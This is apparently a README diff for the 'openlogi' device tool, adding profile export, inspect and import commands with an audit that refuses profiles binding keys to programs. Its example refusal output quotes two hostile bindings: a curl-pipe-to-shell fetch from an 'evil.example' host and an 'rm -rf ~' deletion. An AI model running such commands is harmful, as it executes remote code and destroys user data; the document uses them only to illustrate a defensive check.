@@ -12,10 +12,44 @@ openlogi diag dpi             # read → write → read-back → restore DPI (sm
 openlogi diag smartshift      # toggle SmartShift and restore (smoke test)
 openlogi diag lighting ff0000 # solid colour for a wired RGB keyboard (any RRGGBB hex)
 openlogi mcp                  # serve the agent to an AI assistant over MCP (see below)
+openlogi profile export FILE  # write this machine's whole configuration to a file
+openlogi profile inspect FILE # show what a profile holds, without applying it
+openlogi profile import FILE  # apply a profile, backing up the current one first
 ```
 
 Running `openlogi` with no subcommand defaults to `list`. Set
 `OPENLOGI_LOG=debug` for verbose tracing in the CLI, GUI, or agent.
+
+## Portable profiles
+
+`openlogi profile export` writes the whole configuration to one file you can
+carry to another computer — a USB stick, a network share, whatever you already
+trust. `openlogi profile import` applies it there, copying the existing
+configuration aside first so the change is always reversible. On a machine that
+has never run OpenLogi there is nothing to back up, and the import says so.
+
+A configuration is not inert data: it can bind a button to a shell command, an
+AppleScript, an application launch, or typed text. Importing a profile someone
+sent you is therefore closer to running their script than to loading their
+settings. Import audits first and **refuses by default**, listing exactly what
+it found and where:
+
+```console
+$ openlogi profile import theirs.toml
+this profile contains 2 action(s) that would run a program or type text on your
+machine. Nothing has been imported. Review them, then re-run accepting them if
+you trust the source:
+  keyboard.bindings.f13: RunShellCommand — curl http://evil.example/x.sh | sh
+  keyboard.bindings.f14: TypeText — rm -rf ~
+```
+
+`openlogi profile inspect` shows the same report without applying anything, and
+`--accept-actions` on `import` is how you say you trust the source. Key chords
+are not flagged: they are the ordinary substance of a profile, and flagging
+every one would train you to wave the whole audit through.
+
+Exit status `3` means a profile was refused for this reason, distinct from a
+read or parse failure, so a script can tell them apart.
 
 ## Model Context Protocol server
 
@@ -57,6 +91,8 @@ The tools exposed are:
 | `read_camera_controls` | A webcam's controls with current values, accepted ranges, and auto modes |
 | `set_camera_control` | Set one webcam control, checked against the range that camera reports |
 | `reload_config` | Re-read `config.toml` |
+| `export_profile` / `inspect_profile` / `import_profile` | Portable profiles, with the same audit as the CLI |
+| `config_location` | Where this machine keeps its configuration file |
 
 The camera tools reach the device directly rather than through the agent, the
 same way `openlogi camera` does — UVC controls are a host-exposed class
@@ -65,6 +101,11 @@ CLI's own. Enumeration there is deliberately **not** filtered by vendor: the
 same UVC registers answer on an Elgato, an Obsbot or a built-in camera, so
 restricting the list to one manufacturer would hide devices that are in fact
 controllable.
+
+`import_profile` is deliberately narrower than the CLI: it has no way to accept
+a profile that runs programs. Whether a profile's source is trustworthy is a
+judgement about provenance that a model cannot make, so it reports what it found
+and leaves applying it to a person with `--accept-actions`.
 
 Start from `list_devices`: its output carries, for every device, the route
 object the other tools expect back verbatim, so routes are never assembled by
